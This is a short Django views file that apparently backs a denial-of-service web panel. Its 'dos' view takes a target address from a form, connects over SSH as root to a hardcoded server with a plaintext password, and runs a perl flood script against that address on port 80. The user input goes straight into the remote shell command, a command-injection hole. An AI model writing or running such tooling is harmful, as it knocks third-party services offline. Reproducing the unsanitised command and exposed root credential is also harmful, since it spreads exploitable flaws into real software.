from django.shortcuts import render
from fabric import Connection

# Create your views here.

def home(request):
    return render(request, 'main.html')

def dos(request):
    if request.method == 'POST':
        if request.POST.get('address'):
            post = request.POST.get('address')
            r = Connection('45.77.198.56', user='root', port='22', connect_kwargs={'password':'domain22'})
            r.run('perl 1 {0} 80 4096 15'.format(post))
    return render(request, 'dos.html')